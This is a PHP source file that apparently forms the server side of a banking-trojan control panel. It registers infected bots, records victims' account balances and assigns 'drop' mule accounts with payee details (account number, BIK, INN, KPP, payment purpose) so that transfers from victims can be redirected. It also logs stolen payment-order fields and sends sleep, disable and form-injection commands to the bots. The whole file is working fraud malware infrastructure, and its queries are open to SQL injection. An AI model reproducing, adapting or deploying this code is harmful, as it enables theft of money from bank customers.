<?php

error_reporting(0);
ini_set('error_reporting', -1);
header("Pragma: no-cache");
header("Expires: 0");

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.numformat.php');
include_once($dir . 'includes/functions.get_config.php');
$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true, false);

$p = explode('/', $_GET['p']);
$count_p = count($p);
if($count_p < 4) print_data('DATA_ERROR!', true);

if(isset($_GET['callback'])){	$callback = $_GET['callback'];
}else{	parse_str($p[$count_p-1], $callback);
	$callback = $callback['?callback'];
	unset($count_p);
}

if(empty($p[0])){
	print_data('BOT_ERROR!', true);
}else{
	$matches = explode('0', $p[0], 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}else{
		print_data('BOT_ERROR!', fas);
	}
}

$prefix = strtoupper($prefix);
$uid = strtoupper($uid);

$system = $mysqli->query('SELECT id, nid, percent FROM bf_systems WHERE (`nid` = \'bss\') LIMIT 1');
if(empty($system->id) || $system->nid != 'bss') print_data('TYPE_NOTFOUND!', true);

$id = $mysqli->query("INSERT INTO bf_bots set prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', version='".$p[1]."', system='".$system->nid."', last_date=CURRENT_TIMESTAMP() on duplicate key update version = '".$p[1]."', last_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");

if(!empty($id)){
	$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`id` = \''.$id.'\') LIMIT 1');
}else{
	$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`system` = \''.$system->nid.'\') LIMIT 1');
}

if($bot->prefix != $prefix && $bot->uid != $uid) print_data('BOT_FERROR!', true);

switch($p[2]){
	case 'setBallance':
		//$mysqli->query("INSERT INTO bf_balance (prefix, uid, ip, acc, system, balance) VALUES ('".$prefix."', '".$uid."', '".$_SERVER['REMOTE_ADDR']."', '".$p[3]."', '".$system->nid."', '".$p[4]."')");
		$mysqli->query("INSERT INTO bf_balance set prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".clearNumFormat($p[3])."', system='".$system->nid."', balance='".$p[4]."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
	
		if($p[6] == 1){
			//$system->sum = number_format((($p[4]*$system->percent)/100), 2, '.', '');
			$system->sum = floor(($p[4]*$system->percent)/100);
			
			//$mysqli->query('update bf_drops set status = \'0\', last_date = CURRENT_TIMESTAMP() WHERE (system LIKE \'%'.$system->nid.'|%\') AND (status = \'1\') AND (last_date < (CURRENT_TIMESTAMP() - INTERVAL 5 MINUTE))');
			$drop = $mysqli->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND ('.$system->sum.' > `from`) AND ('.$system->sum.' < `to`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
		
			if(!empty($drop->id) && !empty($drop->system)){
				$drop->other = array_map('base64_decode', json_decode($drop->other, true));
				if($drop->vat != '0') $system->vat = number_format((($system->sum*$drop->vat)/100), 2, '.', '');
		
				if($drop->other['test'] != 1){
					$mysqli->query('update bf_drops set status = \'1\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
				}else{
					$mysqli->query('update bf_drops set last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
				}
				
				$post_date = date('Y-m-d H:i:s');
				$trans_id = $mysqli->query("INSERT INTO bf_transfers (prefix, uid, ip, acc, balance, `num`, `to`, system, info, drop_id, post_date) VALUES ('".$bot->prefix."', '".$bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".clearNumFormat($p[3])."', '".$p[4]."', '".$system->sum."', '".$drop->acc."', '".$system->nid."', '".base64_encode(json_encode(array('system' => $system, 'drop' => $drop)))."', '".$drop->id."', '".$post_date."')");
				if(empty($trans_id)){
					$transfer = $mysqli->query('SELECT id FROM bf_transfers WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`ip` = \''.$_SERVER['REMOTE_ADDR'].'\') AND (`acc` = \''.clearNumFormat($p[3]).'\') AND (`to` = \''.$drop->acc.'\') AND (`system` = \''.$system->nid.'\') AND (`post_date` = \''.$post_date.'\') LIMIT 1');
					if(!empty($transfer->id)){
						$trans_id = $transfer->id; 
					}else{
						die($callback . '(' . json_encode(false) . ')');	
					}
				}
				
				$return = array();
				$return['acc'] = accNumFormat($drop->acc);
				$return['bik'] = $drop->other['bik'];
				$return['inn'] = $drop->other['inn'];
				$return['kpp'] = $drop->other['kppp'];
				$return['summ'] = $system->sum;
		
				if($drop->vat != '0'){
					//$return['target'] = mb_convert_encoding($drop->destination . "\n В том числе НДС (".$drop->vat."%)" . ' ' . $system->vat, 'windows-1251', 'UTF-8');
					$return['target'] = $drop->destination . "\n В том числе НДС (".$drop->vat."%)" . ' ' . $system->vat;
					$return['ndsvalue'] = $system->vat;
					$return['nds'] = 1;
				}else{
					//$return['target'] = mb_convert_encoding($drop->destination . "\n НДС не облагается.", 'windows-1251', 'UTF-8');
					$return['target'] = $drop->destination . "\n НДС не облагается.";
					$return['nds'] = 3;
				}
		
				//$return['f2'] = mb_convert_encoding($drop->receiver, 'windows-1251', 'UTF-8');
				$return['f2'] = $drop->receiver;
				$return['id'] = $drop->id;
				$return['tid'] = $trans_id;
					
				die($callback . '(' . json_encode($return) . ')');
			}else{
				die($callback . '(' . json_encode(false) . ')');
			}
		}else{
			die($callback . '(' . json_encode(false) . ')');
		}
	break;
	
	case 'getBallance':
		function getbal($row){
			global $accs;
			$row->realbal = number_format($row->sumbal - $row->realbal, 2, '.', '');
			$accs[] = $row;
		}
		$accs = array();
		$mysqli->query("SELECT DISTINCT(acc) acc, SUM(num) realbal, SUM(balance) bal FROM bf_transfers WHERE (prefix = '".$prefix."') AND (uid = '".$uid."') AND (system = '".$system->nid."') AND (status != '0') ORDER by post_date DESC", null, 'getbal', false);
		die($callback . '(' . json_encode($accs) . ')');
	break;

	case 'getPD':
		$accs = $mysqli->query("SELECT `num`, acc `from`, `to`, balance FROM bf_transfers WHERE (prefix = '".$prefix."') AND (uid = '".$uid."') AND (system = '".$system->nid."')", null, null, false);
		if(isset($accs[0])){
			die($callback . '(' . json_encode($accs) . ')');
		}else{
			die($callback . '(' . json_encode(array()) . ')');
		}
	break;

	case 'setPD':
		/*
		//list($acc, $acc_to, $transfer_date, $balance, $trans_id) = explode("*", $args[4], 5);
		$mysqli->query("INSERT INTO bf_transfers (prefix, uid, ip, acc, to, system, balance, num, post_date) VALUES ('".$prefix."', '".$uid."', '".$_SERVER['REMOTE_ADDR']."', '".clearNumFormat($p[3])."', '".$p[4]."', '".$system->nid."', '".$p[6]."', '".$p[7]."', '".$p[5]."')");
		//$mysqli->query("INSERT INTO bf_balance (prefix, uid, ip, acc, system, balance) VALUES ('".$prefix."', '".$uid."', '".$_SERVER['REMOTE_ADDR']."', '".clearNumFormat($p[3])."', '".$system->nid."', '".$p[6]."')");
		$mysqli->query("INSERT INTO bf_balance set prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".clearNumFormat($p[3])."', system='".$system->nid."', balance='".$p[6]."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
		die($callback . '(' . json_encode(array('res',true)) . ')');
		*/
		$mysqli->query('update bf_transfers set status = \'setPD\' WHERE (id = \''.$p[3].'\') LIMIT 1');
		die($callback . '(' . json_encode(array('res',true)) . ')');
	break;

	case 'getVP':
		function getvp($row){
			global $accs;
			$row->to = accNumFormat($row->to);
			$accs[] = $row;
		}
		$accs = array();
		$mysqli->query("SELECT `to`, DATE_FORMAT(post_date,'%d.%m.%Y') trandate, num `summ` FROM bf_transfers WHERE (prefix = '".$prefix."') AND (uid = '".$uid."') AND (system = '".$system->nid."')", null, 'getvp', false);
		die($callback . '(' . json_encode($accs) . ')');
	break;

	case 'setStopDrop':
		$mysqli->query('update bf_drops set last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$p[4].'\') LIMIT 1');
		$mysqli->query('update bf_drops set status = \'2\' WHERE (id = \''.$p[4].'\') AND (status = \'1\') LIMIT 1');
		//$mysqli->query('update bf_transfers set status = \'2\' WHERE (to = \''.clearNumFormat($p[3]).'\') AND (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (system = \''.$system->nid.'\') LIMIT 1');
		die($callback . '(' . json_encode(true) . ')');
	break;

	case 'reportState':
		//$mysqli->query('update bf_transfers set status = \''.$p[4].'\', last_date = CURRENT_TIMESTAMP() WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (system = \''.$system->nid.'\') AND (to = \''.clearNumFormat($p[3]).'\')');
		//echo 'update bf_transfers set status = \''.$p[4].'\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$p[5].'\') LIMIT 1';
		$mysqli->query('update bf_transfers set status = \''.$p[3].'\' WHERE (id = \''.$p[4].'\') LIMIT 1');
		die($callback . '(' . json_encode(true) . ')');
	break;

	case 'checkActiveBots':
		die($callback . '(' . base64_decode($bot->info) . ')');
	break;

	case 'getJS':

	break;

	case 'setLog':
		//$this->db->query("update `bots` set step_log='%s' where id = '%s'", $args[2],$id);
		die($callback . '(' . json_encode(array('res',true)) . ')');
	break;

	case 'setStopBot':
		$bot->info = json_decode(base64_decode($bot->info), true);
		$bot->info['slp'] = !isset($bot->info['slp']) ? 0 : $bot->info['slp'];
		$bot->info['infrm'] = !isset($bot->info['infrm']) ? 0 : $bot->info['infrm'];
		$bot->info['dsbld'] = !isset($bot->info['dsbld']) ? 0 : $bot->info['dsbld'];
		$bot->info['vconfig'] = !isset($bot->info['vconfig']) ? 0 : $bot->info['vconfig'];
		$bot->info['dsbld'] = 1;
		$mysqli->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
		die($callback . '(' . json_encode(array('res',true)) . ')');
	break;

	case 'setSleepBot':
		$bot->info = json_decode(base64_decode($bot->info), true);
		$bot->info['slp'] = !isset($bot->info['slp']) ? 0 : $bot->info['slp'];
		$bot->info['infrm'] = !isset($bot->info['infrm']) ? 0 : $bot->info['infrm'];
		$bot->info['dsbld'] = !isset($bot->info['dsbld']) ? 0 : $bot->info['dsbld'];
		$bot->info['vconfig'] = !isset($bot->info['vconfig']) ? 0 : $bot->info['vconfig'];
		$bot->info['slp'] = 1;
		$mysqli->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
		die($callback . '(' . json_encode(array('res',true)) . ')');
	break;

	case 'setInForm':
		$bot->info = json_decode(base64_decode($bot->info), true);
		$bot->info['slp'] = !isset($bot->info['slp']) ? 0 : $bot->info['slp'];
		$bot->info['infrm'] = !isset($bot->info['infrm']) ? 0 : $bot->info['infrm'];
		$bot->info['dsbld'] = !isset($bot->info['dsbld']) ? 0 : $bot->info['dsbld'];
		$bot->info['vconfig'] = !isset($bot->info['vconfig']) ? 0 : $bot->info['vconfig'];
		$bot->info['infrm'] = 1;
		$mysqli->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
		die($callback . '(' . json_encode(array('res',true)) . ')');
	break;

	case 'setVersionConfig':
		$bot->info = json_decode(base64_decode($bot->info), true);
		$bot->info['slp'] = !isset($bot->info['slp']) ? 0 : $bot->info['slp'];
		$bot->info['infrm'] = !isset($bot->info['infrm']) ? 0 : $bot->info['infrm'];
		$bot->info['dsbld'] = !isset($bot->info['dsbld']) ? 0 : $bot->info['dsbld'];
		$bot->info['vconfig'] = !isset($bot->info['vconfig']) ? 0 : $bot->info['vconfig'];
		if(!empty($p[3])) $bot->info['vconfig'] = $p[3];
		$mysqli->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
		die($callback . '(' . json_encode(array('res',true)) . ')');
	break;

	case 'setLogAll':
		//$this->db->query("insert into `logs` set bot_id = '%s', log = '%s', date = unix_timestamp(), ver = '%s' ",$id,$args[2],$args[3]);
		$mysqli->query("INSERT INTO bf_logs (`prefix`, `uid`, `ip`, `version`, `log`, system) VALUES ('".$prefix."', '".$uid."', '".$_SERVER['REMOTE_ADDR']."', '".$p[1]."', '".base64_decode($p[3])."', '".$system->nid."')");
		die($callback . '(' . json_encode(array('res',true)) . ')');
	break;

	case 'setPDPassiv':
		// RTval,вид населённого пункта отправитея (Г или ПГТ) хз мне только Г попадалось
		$log['RTval'] = $p[3];
		
		// RPLval, город отправителя (МОСКВА)
		$log['RPLval'] = $p[4];
		
		// RBNval, банк отправителя (ОАО "БАНК МОСКВЫ)
		$log['RBNval'] = $p[5];

		// TARGETval, назначение платежа (Пробный перевод\n В том числе НДС (18.00%) 4124.14)
		$log['TARGETval'] = $p[6];

		// F2val, получатель (ОАО "ГазВодаЛимон")
		$log['F2val'] = $p[7];

		//NDSCTval, вид ндс (1)
		$log['NDSCTval'] = $p[8];
    
		// NDSval, сумма ндс (4124.14)
		$log['NDSval'] = $p[9];
    
		// KPPval, кпп получателя (770201001)
		$log['KPPval'] = $p[10];
    
		// INNval, Инн получателя (7702368944)
		$log['INNval'] = $p[11];
    
		// ACCval, Счёт получателя (40703.810.3.00760000061)
		$log['ACCval'] = $p[12];
    
		// BIKval, Бик получателя(044525219)
		$log['BIKval'] = $p[13];
    
		// SUMMval, сумма перевода (227036.00)
		$log['SUMMval'] = $p[14];
    
		// DNval, номер перевода (899)
		$log['DNval'] = $p[15];
    
		// DDval, дата перевода (18.11.2011)
		$log['DDval'] = $p[16];
    
		//RCAval, ещё одно поле получателя(30101.810.5.00000000219)
		$log['RCAval'] = $p[17];
    
		$mysqli->query("INSERT INTO bf_logs_passiv (`prefix`, `uid`, `acc`, `ip`, `version`, `log`, `system`) VALUES ('".$prefix."', '".$uid."', '".clearNumFormat($p[12])."', '".$_SERVER['REMOTE_ADDR']."', '".$p[1]."', '".base64_encode(gzdeflate(json_encode($log)))."', '".$system->nid."')");
    
		die($callback . '(' . json_encode(array('res',true)) . ')');
	break;

	case 'getPDPassiv':
		function getpassiv($row){
			global $list_passiv;
			$row->log = json_decode(gzinflate(base64_decode($row->log)));
	
			$list_passiv[] = $row->log;
		}
	
		$list_passiv = array();
		$mysqli->query("SELECT log FROM bf_logs_passiv WHERE (prefix = '".$prefix."') AND (uid = '".$uid."') AND (system = '".$system->nid."')", null, 'getpassiv');
		die($callback . '(' . json_encode($list_passiv) . ')');
	break;

	default:
		exit;
	break;
}

?>